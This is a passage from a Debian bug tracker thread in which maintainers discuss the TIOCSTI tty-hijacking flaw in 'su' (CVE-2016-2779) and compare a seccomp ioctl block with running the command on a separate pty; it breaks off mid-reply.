to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sun, 02 Oct 2016 09:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=198), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=198), [link](#197)).

---

**Acknowledgement sent**
to `up201407890@alunos.dcc.fc.up.pt`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 02 Oct 2016 09:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=200), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=200), [link](#199)).

---

[Message #201](#201) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=201), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=201), reply):

![](/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt)
From: up201407890@alunos.dcc.fc.up.pt
To: 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Sun, 02 Oct 2016 10:54:06 +0200
```
Hello Simon,

This has been recently patched by using seccomp to blacklist this ioctl.

<https://github.com/karelzak/util-linux/commit/8e4925016875c6a4f2ab4f833ba66f0fc57396a2>

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 13:42:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=203), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=203), [link](#202)).

---

**Acknowledgement sent**
to `Simon Ruderich <simon@ruderich.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 13:42:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=205), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=205), [link](#204)).

---

[Message #206](#206) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=206), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=206), reply):

![](/cgi-bin/libravatar.cgi?email=simon%40ruderich.org)
From: Simon Ruderich <simon@ruderich.org>
To: up201407890@alunos.dcc.fc.up.pt, Karel Zak <kzak@redhat.com>
Cc: 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 3 Oct 2016 15:34:49 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=206) (text/plain, inline)]
```
```
On Sun, Oct 02, 2016 at 10:54:06AM +0200, up201407890@alunos.dcc.fc.up.pt wrote:
> Hello Simon,
>
> This has been recently patched by using seccomp to blacklist this ioctl.
>
> <https://github.com/karelzak/util-linux/commit/8e4925016875c6a4f2ab4f833ba66f0fc57396a2>

Hello,

This is an awful hack! Blacklisting this single ioctl will fix
only this specific issue, but the underlying problem, that the
unprivileged user has access to the original tty, is still
unfixed.

The (later) patches in this bug report go in a different
direction and fix the underlying problem by opening a new session
with a separate tty and "proxying" the output (SSH also uses this
approach - only over the network). This seems to me like a much
better option than blacklisting a single ioctl.

@Karel: Could you please have a look at the patches in this bug
report which use setsid() to create a new session and adapt your
commit with a patch based on this approach? Sudo's use_pty option
does the same to fix this issue (but not enabled by default).

Regards
Simon
--
+ privacy is necessary
+ using gnupg <http://gnupg.org>
+ public key id: 0x92FEFDB7E44C32F9

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=206) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 14:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=208), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=208), [link](#207)).

---

**Acknowledgement sent**
to `up201407890@alunos.dcc.fc.up.pt`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 14:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=210), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=210), [link](#209)).

---

[Message #211](#211) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=211), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=211), reply):

![](/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt)
From: up201407890@alunos.dcc.fc.up.pt
To: "Simon Ruderich" <simon@ruderich.org>
Cc: "Karel Zak" <kzak@redhat.com>, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 03 Oct 2016 16:11:41 +0200
```
Quoting "Simon Ruderich" <simon@ruderich.org>:

Btw, at least in redhat based systems, su uses setsid() when the -c
option is given, just like use_pty in sudo. Not sure if this is true
in debian.

> On Sun, Oct 02, 2016 at 10:54:06AM +0200,
> up201407890@alunos.dcc.fc.up.pt wrote:
>> Hello Simon,
>>
>> This has been recently patched by using seccomp to blacklist this ioctl.
>>
>> <https://github.com/karelzak/util-linux/commit/8e4925016875c6a4f2ab4f833ba66f0fc57396a2>
>
> Hello,
>
> This is an awful hack! Blacklisting this single ioctl will fix
> only this specific issue, but the underlying problem, that the
> unprivileged user has access to the original tty, is still
> unfixed.
>
> The (later) patches in this bug report go in a different
> direction and fix the underlying problem by opening a new session
> with a separate tty and "proxying" the output (SSH also uses this
> approach - only over the network). This seems to me like a much
> better option than blacklisting a single ioctl.
>
> @Karel: Could you please have a look at the patches in this bug
> report which use setsid() to create a new session and adapt your
> commit with a patch based on this approach? Sudo's use_pty option
> does the same to fix this issue (but not enabled by default).
>
> Regards
> Simon
> --
> + privacy is necessary
> + using gnupg <http://gnupg.org>
> + public key id: 0x92FEFDB7E44C32F9
>

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 14:27:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=213), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=213), [link](#212)).

---

**Acknowledgement sent**
to `Karel Zak <kzak@redhat.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 14:27:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=215), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=215), [link](#214)).

---

[Message #216](#216) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=216), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=216), reply):

![](/cgi-bin/libravatar.cgi?email=kzak%40redhat.com)
From: Karel Zak <kzak@redhat.com>
To: up201407890@alunos.dcc.fc.up.pt
Cc: Simon Ruderich <simon@ruderich.org>, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 3 Oct 2016 16:22:47 +0200
```
On Mon, Oct 03, 2016 at 04:11:41PM +0200, up201407890@alunos.dcc.fc.up.pt wrote:
> Quoting "Simon Ruderich" <simon@ruderich.org>:
>
> Btw, at least in redhat based systems, su uses setsid() when the -c option
> is given, just like use_pty in sudo. Not sure if this is true in debian.

The problem is that we don't want to use setsid() in all situations,
because it will introduce regressions. From util-linux ReleaseNotes:

 [CVE-2016-2779](https://security-tracker.debian.org/tracker/CVE-2016-2779)

 This security issue is NOT FIXED yet.  It is possible to disable the
 ioctl TIOCSTI by setsid() only.  Unfortunately, setsid() has
 well-defined use cases in su(1) and runuser(1) and any changes would
 introduce regressions.  It seems we need a better way -- ideally
 another ioctl (or whatever is supported by the kernel) to disable
 TIOCSTI without setsid().

and yes, blacklisting ioctl is hack.

    Karel

--
 Karel Zak  <kzak@redhat.com>
 <http://karelzak.blogspot.com>

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 15:00:07 GMT) ([full text](bugreport.cgi?bug=628843;msg=218), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=218), [link](#217)).

---

**Acknowledgement sent**
to `Karel Zak <kzak@redhat.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 15:00:07 GMT) ([full text](bugreport.cgi?bug=628843;msg=220), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=220), [link](#219)).

---

[Message #221](#221) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=221), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=221), reply):

![](/cgi-bin/libravatar.cgi?email=kzak%40redhat.com)
From: Karel Zak <kzak@redhat.com>
To: Simon Ruderich <simon@ruderich.org>
Cc: up201407890@alunos.dcc.fc.up.pt, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 3 Oct 2016 16:56:08 +0200
```
On Mon, Oct 03, 2016 at 03:34:49PM +0200, Simon Ruderich wrote:
> @Karel: Could you please have a look at the patches in this bug
> report which use setsid() to create a new session and adapt your
> commit with a patch based on this approach? Sudo's use_pty option
> does the same to fix this issue (but not enabled by default).

I'll think about it.

    Karel

--
 Karel Zak  <kzak@redhat.com>
 <http://karelzak.blogspot.com>

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 18:48:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=223), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=223), [link](#222)).

---

**Acknowledgement sent**
to `Simon Ruderich <simon@ruderich.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 18:48:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=225), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=225), [link](#224)).

---

[Message #226](#226) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=226), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=226), reply):

![](/cgi-bin/libravatar.cgi?email=simon%40ruderich.org)
From: Simon Ruderich <simon@ruderich.org>
To: Karel Zak <kzak@redhat.com>
Cc: up201407890@alunos.dcc.fc.up.pt, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 3 Oct 2016 20:45:53 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=226) (text/plain, inline)]
```
```
On Mon, Oct 03, 2016 at 04:22:47PM +0200, Karel Zak wrote:
> The problem is that we don't want to use setsid() in all situations,
> because it will introduce regressions. From util-linux ReleaseNotes:

Hello,

Thanks for your quick reply.

In which situations will this cause regressions? I tried to find
cases where this will break, but I can't think of any (I guess
that's because I'm just using su in a very basic way).

Regards
Simon
--
+ privacy is necessary
+ using gnupg <http://gnupg.org>
+ public key id: 0x92FEFDB7E44C32F9

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=226) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 18:48:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=228), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=228), [link](#227)).

---

**Acknowledgement sent**
to `Simon Ruderich <simon@ruderich.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 18:48:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=230), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=230), [link](#229)).

---

[Message #231](#231) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=231), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=231), reply):

![](/cgi-bin/libravatar.cgi?email=simon%40ruderich.org)
From: Simon Ruderich <simon@ruderich.org>
To: up201407890@alunos.dcc.fc.up.pt
Cc: Karel Zak <kzak@redhat.com>, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 3 Oct 2016 20:46:26 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=231) (text/plain, inline)]
```
```
On Mon, Oct 03, 2016 at 04:11:41PM +0200, up201407890@alunos.dcc.fc.up.pt wrote:
> Btw, at least in redhat based systems, su uses setsid() when the -c option
> is given, just like use_pty in sudo. Not sure if this is true in debian.

Yes, that's true in Debian as well.

Regards
Simon
--
+ privacy is necessary
+ using gnupg <http://gnupg.org>
+ public key id: 0x92FEFDB7E44C32F9

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=231) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 19:27:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=233), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=233), [link](#232)).

---

**Acknowledgement sent**
to `up201407890@alunos.dcc.fc.up.pt`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 19:27:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=235), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=235), [link](#234)).

---

[Message #236](#236) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=236), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=236), reply):

![](/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt)
From: up201407890@alunos.dcc.fc.up.pt
To: "Simon Ruderich" <simon@ruderich.org>
Cc: "Karel Zak" <kzak@redhat.com>, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 03 Oct 2016 21:22:50 +0200
```
Quoting "Simon Ruderich" <simon@ruderich.org>:

Loss of job control in the shell.

> On Mon, Oct 03, 2016 at 04:22:47PM +0200, Karel Zak wrote:
>> The problem is that we don't want to use setsid() in all situations,
>> because it will introduce regressions. From util-linux ReleaseNotes:
>
> Hello,
>
> Thanks for your quick reply.
>
> In which situations will this cause regressions? I tried to find
> cases where this will break, but I can't think of any (I guess
> that's because I'm just using su in a very basic way).
>
> Regards
> Simon
> --
> + privacy is necessary
> + using gnupg <http://gnupg.org>
> + public key id: 0x92FEFDB7E44C32F9
>

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 19:39:02 GMT) ([full text](bugreport.cgi?bug=628843;msg=238), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=238), [link](#237)).

---

**Acknowledgement sent**
to `Simon Ruderich <simon@ruderich.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 19:39:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=240), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=240), [link](#239)).

---

[Message #241](#241) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=241), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=241), reply):

![](/cgi-bin/libravatar.cgi?email=simon%40ruderich.org)
From: Simon Ruderich <simon@ruderich.org>
To: up201407890@alunos.dcc.fc.up.pt
Cc: Karel Zak <kzak@redhat.com>, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 3 Oct 2016 21:34:14 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=241) (text/plain, inline)]
```
```
On Mon, Oct 03, 2016 at 09:22:50PM +0200, up201407890@alunos.dcc.fc.up.pt wrote:
> Loss of job control in the shell.

I'm confused. I'm not talking about removing the controlling
terminal, but instead spawning a new session, opening a new pts
and connecting that to the program. This way the program has a
tty, job control works, but the tty is different and therefore
can't be controlled by the less-privileged account.

Regards
Simon
--
+ privacy is necessary
+ using gnupg <http://gnupg.org>
+ public key id: 0x92FEFDB7E44C32F9

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=241) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 19:51:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=243), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=243), [link](#242)).

---

**Acknowledgement sent**
to `Karel Zak <kzak@redhat.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 19:51:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=245), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=245), [link](#244)).

---

[Message #246](#246) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=246), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=246), reply):

![](/cgi-bin/libravatar.cgi?email=kzak%40redhat.com)
From: Karel Zak <kzak@redhat.com>
To: Simon Ruderich <simon@ruderich.org>
Cc: up201407890@alunos.dcc.fc.up.pt, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 3 Oct 2016 21:49:08 +0200
```
On Mon, Oct 03, 2016 at 09:34:14PM +0200, Simon Ruderich wrote:
> On Mon, Oct 03, 2016 at 09:22:50PM +0200, up201407890@alunos.dcc.fc.up.pt wrote:
> > Loss of job control in the shell.
>
> I'm confused. I'm not talking about removing the controlling
> terminal, but instead spawning a new session, opening a new pts
> and connecting that to the program. This way the program has a
> tty, job control works, but the tty is different and therefore
> can't be controlled by the less-privileged account.

Yes, I'm thinking about this way (as discussed on util-linux
mailing list), but it's relatively complex.

My plan is to try to implement it. We will see.

    Karel

--
 Karel Zak  <kzak@redhat.com>
 <http://karelzak.blogspot.com>

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 20:03:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=248), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=248), [link](#247)).

---

**Acknowledgement sent**
to `up201407890@alunos.dcc.fc.up.pt`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 20:03:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=250), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=250), [link](#249)).

---

[Message #251](#251) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=251), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=251), reply):

![](/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt)
From: up201407890@alunos.dcc.fc.up.pt
To: "Karel Zak" <kzak@redhat.com>
Cc: "Simon Ruderich" <simon@ruderich.org>, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 03 Oct 2016 21:58:23 +0200
```
Quoting "Karel Zak" <kzak@redhat.com>:

Anyways, it is bad admin practice and/or an invasion of privacy to su
to an unprivileged user.

This has been talked alot in the past, in most of the times even
closed as "WONTFIX".

What I'm saying is, it's OK if you can't come up with something.
Better use 'su -c' in any case.

> On Mon, Oct 03, 2016 at 09:34:14PM +0200, Simon Ruderich wrote:
>> On Mon, Oct 03, 2016 at 09:22:50PM +0200,
>> up201407890@alunos.dcc.fc.up.pt wrote:
>> > Loss of job control in the shell.
>>
>> I'm confused. I'm not talking about removing the controlling
>> terminal, but instead spawning a new session, opening a new pts
>> and connecting that to the program. This way the program has a
>> tty, job control works, but the tty is different and therefore
>> can't be controlled by the less-privileged account.
>
> Yes, I'm thinking about this way (as discussed on util-linux
> mailing list), but it's relatively complex.
>
> My plan is to try to implement it. We will see.
>
>     Karel
>
> --
>  Karel Zak  <kzak@redhat.com>
>  <http://karelzak.blogspot.com>
>

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 20:27:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=253), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=253), [link](#252)).

---

**Acknowledgement sent**
to `Simon Ruderich <simon@ruderich.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 20:27:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=255), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=255), [link](#254)).

---

[Message #256](#256) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=256), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=256), reply):

![](/cgi-bin/libravatar.cgi?email=simon%40ruderich.org)
From: Simon Ruderich <simon@ruderich.org>
To: up201407890@alunos.dcc.fc.up.pt
Cc: Karel Zak <kzak@redhat.com>, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 3 Oct 2016 22:22:55 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=256) (text/plain, inline)]
```
```
On Mon, Oct 03, 2016 at 09:58:23PM +0200, up201407890@alunos.dcc.fc.up.pt wrote:
> Anyways, it is bad admin practice and/or an invasion of privacy to su to an
> unprivileged user.

Please explain to me why this is bad admin practice.

Lets assume I have an unprivileged user which is used to execute
a script in an isolated context. Now that script breaks and I
have to debug it. The user has no shell nor password. How do I
run a command as that user? What I did in the past was to run su
-s /bin/sh user and then debug and fix the problem. What is wrong
with that setup?

> This has been talked alot in the past, in most of the times even closed as
> "WONTFIX".

In that case su should prevent a user from doing it, not causing
a security hole and not documenting that fact.

> What I'm saying is, it's OK if you can't come up with something. Better use
> 'su -c' in any case.

Often a terminal with a shell makes debugging much less painful.
su -c doesn't help there.

Regards
Simon
--
+ privacy is necessary
+ using gnupg <http://gnupg.org>
+ public key id: 0x92FEFDB7E44C32F9

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=256) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 20:27:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=258), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=258), [link](#257)).

---

**Acknowledgement sent**
to `Simon Ruderich <simon@ruderich.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 20:27:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=260), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=260), [link](#259)).

---

[Message #261](#261) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=261), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=261), reply):

![](/cgi-bin/libravatar.cgi?email=simon%40ruderich.org)
From: Simon Ruderich <simon@ruderich.org>
To: Karel Zak <kzak@redhat.com>
Cc: up201407890@alunos.dcc.fc.up.pt, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 3 Oct 2016 22:25:54 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=261) (text/plain, inline)]
```
```
On Mon, Oct 03, 2016 at 09:49:08PM +0200, Karel Zak wrote:
> Yes, I'm thinking about this way (as discussed on util-linux
> mailing list), but it's relatively complex.

I have a working solution here. It's a standalone program and not
very well tested, but works fine for me. Just tell me if you want
to get the source. (Disclaimer: I'm no terminal expert, so be
careful with trusting it too much.)

This bug also has some patches which implement exactly that and
may just need a little refinement.

Regards
Simon
--
+ privacy is necessary
+ using gnupg <http://gnupg.org>
+ public key id: 0x92FEFDB7E44C32F9

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=261) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 21:12:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=263), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=263), [link](#262)).

---

**Acknowledgement sent**
to `up201407890@alunos.dcc.fc.up.pt`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 21:12:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=265), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=265), [link](#264)).

---

[Message #266](#266) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=266), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=266), reply):

![](/cgi-bin/libravatar.cgi?email=up201407890%40alunos.dcc.fc.up.pt)
From: up201407890@alunos.dcc.fc.up.pt
To: "Simon Ruderich" <simon@ruderich.org>
Cc: "Karel Zak" <kzak@redhat.com>, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Mon, 03 Oct 2016 23:07:59 +0200
```
Quoting "Simon Ruderich" <simon@ruderich.org>:

It's an invasion of privacy, as I said, for normal users.

In your case, if you're changing to an unprivileged user without a
shell nor password, probably some sort of "locked" account, how is an
attacker going to make use of TIOCSTI to exploit your system?
(Assuming you're not going to run untrusted applications).

Now imagine that that locked user got compromised. Changing to a
compromised user IS and will ALWAYS be bad practice. So, if you don't
know if the user is compromised or not, don't log into that account,
as simple as that. All sorts of bad things can happen.

Just my 2 cents.

> On Mon, Oct 03, 2016 at 09:58:23PM +0200,
> up201407890@alunos.dcc.fc.up.pt wrote:
>> Anyways, it is bad admin practice and/or an invasion of privacy to su to an
>> unprivileged user.
>
> Please explain to me why this is bad admin practice.
>
> Lets assume I have an unprivileged user which is used to execute
> a script in an isolated context. Now that script breaks and I
> have to debug it. The user has no shell nor password. How do I
> run a command as that user? What I did in the past was to run su
> -s /bin/sh user and then debug and fix the problem. What is wrong
> with that setup?
>
>> This has been talked alot in the past, in most of the times even closed as
>> "WONTFIX".
>
> In that case su should prevent a user from doing it, not causing
> a security hole and not documenting that fact.
>
>> What I'm saying is, it's OK if you can't come up with something. Better use
>> 'su -c' in any case.
>
> Often a terminal with a shell makes debugging much less painful.
> su -c doesn't help there.
>
> Regards
> Simon
> --
> + privacy is necessary
> + using gnupg <http://gnupg.org>
> + public key id: 0x92FEFDB7E44C32F9
>

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 03 Oct 2016 22:30:02 GMT) ([full text](bugreport.cgi?bug=628843;msg=268), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=268), [link](#267)).

---

**Acknowledgement sent**
to `Simon Ruderich <simon@ruderich.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 03 Oct 2016 22:30:02 GMT) ([full text](bugreport.cgi?bug=628843;msg=270), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=270), [link](#269)).

---

[Message #271](#271) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=271), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=271), reply):

![](/cgi-bin/libravatar.cgi?email=simon%40ruderich.org)
From: Simon Ruderich <simon@ruderich.org>
To: up201407890@alunos.dcc.fc.up.pt
Cc: Karel Zak <kzak@redhat.com>, 628843@bugs.debian.org
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Tue, 4 Oct 2016 00:27:02 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=271) (text/plain, inline)]
```
```
On Mon, Oct 03, 2016 at 11:07:59PM +0200, up201407890@alunos.dcc.fc.up.pt wrote:
> It's an invasion of privacy, as I said, for normal users.

Sure, but that's not my use case.

